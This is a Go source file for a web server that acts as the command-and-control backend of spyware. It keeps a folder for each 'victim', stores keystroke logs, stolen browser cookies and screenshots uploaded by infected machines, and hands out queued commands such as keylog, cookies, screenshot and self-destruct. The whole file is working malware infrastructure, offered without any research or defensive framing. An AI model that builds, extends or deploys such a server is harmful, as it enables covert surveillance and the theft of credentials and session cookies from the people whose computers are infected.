package main

import (
	"bytes"
	"fmt"
	"github.com/gin-gonic/gin"
	_ "github.com/gin-gonic/gin"
	"image/png"
	"net/http"
	"os"
	"regexp"
	"time"
)
import _ "net/http"

type Log struct {
	Date   time.Time `json:"date"`
	Victim string    `json:"victim"`
}

type TextLog struct {
	Log  Log    `json:"log"`
	Body string `json:"body"`
}

type ImageLog struct {
	Log  Log    `json:"log"`
	Body []byte `json:"body"`
}

const (
	KeylogAction        = "keylog"
	LazyKeylogAction    = "lazyKeylog"
	CookieMonsterAction = "cookies"
	ScreenshotAction    = "screenshot"
	SelfDestructAction  = "self-destruct"
	StopAction          = "stop (keylog|lazyKeylog|cookies|screenshot)"

	DefaultCommand = CookieMonsterAction

	KeylogFilename     = "keylog.txt"
	ScreenshotFilename = "ss.png"
	LazyKeylogFilename = "lazyKeylog.txt"
	CookiesFilename    = "cookies.txt"

	ErrorMessage = "No action"
	ActionKey    = "action"
)

var CommandsStack []TextLog

func checkCommand(command string) bool {
	val, _ := regexp.Match(StopAction, []byte(command))
	return val || command == KeylogAction || command == LazyKeylogAction || command == SelfDestructAction || command == CookieMonsterAction || command == ScreenshotAction
}

func main() {

	sv := gin.Default()

	sv.POST("/", func(c *gin.Context) {
		var text TextLog
		if err := c.ShouldBindJSON(&text); err == nil {
			file, err := os.OpenFile(fmt.Sprintf("%s/%s", text.Log.Victim, KeylogFilename), os.O_APPEND|os.O_CREATE, 0755)
			defer func(file *os.File) {
				err := file.Close()
				if err != nil {
					c.JSON(http.StatusInternalServerError, nil)
				}
			}(file)
			if err != nil {
				c.JSON(http.StatusServiceUnavailable, gin.H{
					ActionKey: "Not an available file",
				})
				return
			}
			err = LogEntry(file, &text, false)
			if err != nil {
				c.JSON(http.StatusBadRequest, gin.H{
					ActionKey: "cannot append to file",
				})
				return
			}
		}
		c.JSON(200, gin.H{
			ActionKey: DefaultCommand,
		})
	})

	sv.POST("/lazyKeylog", func(c *gin.Context) {
		var text TextLog
		if err := c.ShouldBindJSON(&text); err == nil {
			file, err := os.OpenFile(fmt.Sprintf("%s/%s", text.Log.Victim, LazyKeylogFilename), os.O_APPEND|os.O_CREATE, 0755)
			defer func(file *os.File) {
				err := file.Close()
				if err != nil {
					c.JSON(http.StatusInternalServerError, nil)
				}
			}(file)
			if err != nil {
				c.JSON(http.StatusServiceUnavailable, gin.H{
					ActionKey: "Not an available file",
				})
				return
			}
			err = LogEntry(file, &text, true)
			if err != nil {
				c.JSON(http.StatusBadRequest, gin.H{
					ActionKey: "cannot append to file",
				})
				return
			}
		}
		c.JSON(200, gin.H{
			ActionKey: DefaultCommand,
		})
	})

	sv.POST("/commands", func(context *gin.Context) {
		var victim Log
		if err := context.ShouldBindJSON(&victim); err == nil {
			if len(CommandsStack) > 0 {
				comm := getCommand(victim.Victim)
				if comm == nil {
					context.JSON(http.StatusNotFound, gin.H{
						ActionKey: ErrorMessage,
					})
					return
				}
				context.JSON(http.StatusOK, gin.H{
					ActionKey: comm.Body,
				})
				return
			}
		}
		context.JSON(http.StatusOK, gin.H{
			ActionKey: ErrorMessage,
		})
	})

	sv.POST("/appendCommands", func(context *gin.Context) {
		var command TextLog
		if err := context.ShouldBindJSON(&command); err == nil {
			err2 := checkCommand(command.Body)
			if !err2 {
				context.JSON(http.StatusNotFound, gin.H{
					ActionKey: "Command submitted is not a recognized command",
				})
				return
			}
			CommandsStack = append(CommandsStack, command)
			context.JSON(http.StatusOK, struct{}{})
			return

		}
		context.JSON(http.StatusNotFound, gin.H{
			ActionKey: ErrorMessage,
		})
	})

	sv.POST("/owner", func(context *gin.Context) {
		var text TextLog
		if err := context.ShouldBindJSON(&text); err == nil {
			if _, err = os.Stat(fmt.Sprintf("./%s", text.Log.Victim)); os.IsNotExist(err) {
				err := os.Mkdir(text.Log.Victim, 0755)
				if err != nil {
					context.JSON(http.StatusBadRequest, gin.H{
						ActionKey: "Cannot create directory",
					})
				}
			}
		}
		context.JSON(200, gin.H{
			ActionKey: DefaultCommand,
		})
	})

	sv.POST("/cookies", func(c *gin.Context) {
		var text TextLog
		if err := c.ShouldBindJSON(&text); err == nil {
			file, err := os.OpenFile(fmt.Sprintf("%s/%s", text.Log.Victim, CookiesFilename), os.O_APPEND|os.O_CREATE, 0755)
			defer func(file *os.File) {
				err := file.Close()
				if err != nil {
					c.JSON(http.StatusInternalServerError, nil)
				}
			}(file)
			if err != nil {
				c.JSON(http.StatusServiceUnavailable, gin.H{
					ActionKey: "Not an available file",
				})
				return
			}
			err = LogEntry(file, &text, true)
			if err != nil {
				c.JSON(http.StatusBadRequest, gin.H{
					ActionKey: "cannot append to file",
				})
				return
			}
		}
		c.JSON(200, gin.H{
			ActionKey: DefaultCommand,
		})
	})

	sv.POST("/screenshot", func(c *gin.Context) {
		var text ImageLog
		if err := c.ShouldBindJSON(&text); err == nil {
			img, err := png.Decode(bytes.NewReader(text.Body))
			if err != nil {
				fmt.Println(err)
			}

			//save the imgByte to file
			out, err := os.Create(fmt.Sprintf("%s/%s", text.Log.Victim, ScreenshotFilename))
			defer out.Close()

			if err != nil {
				fmt.Println(err)
			}

			err = png.Encode(out, img)

			if err != nil {
				fmt.Println(err)
			}
		} else {
			println(err)
		}
		c.JSON(200, gin.H{
			ActionKey: DefaultCommand,
		})
	})

	sv.Run()

}

func getCommand(victim string) *TextLog {
	for i := 0; i < len(CommandsStack); i += 1 {
		if CommandsStack[i].Log.Victim == victim {
			comm := CommandsStack[i]
			CommandsStack = append(CommandsStack[:i], CommandsStack[(i+1):]...)
			return &comm
		}
	}
	return nil
}
